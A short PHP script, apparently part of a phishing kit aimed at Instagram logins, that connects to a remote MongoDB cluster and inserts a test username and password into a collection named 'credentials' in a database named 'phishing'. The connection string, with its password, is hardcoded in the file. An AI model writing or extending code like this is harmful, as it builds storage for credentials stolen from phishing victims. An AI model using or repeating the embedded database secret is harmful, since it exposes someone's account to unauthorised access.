<?php
require 'vendor/autoload.php';

$client = new MongoDB\Client("mongodb+srv://ig-login:C1gd6Iec6MX2LXUD@ig-login.fqd6tee.mongodb.net/");

$collection = $client->phishing->credentials;

$insertResult = $collection->insertOne([
    'username' => 'test_user',
    'password' => '123456'
]);

echo "บันทึกสำเร็จ ID: " . $insertResult->getInsertedId();
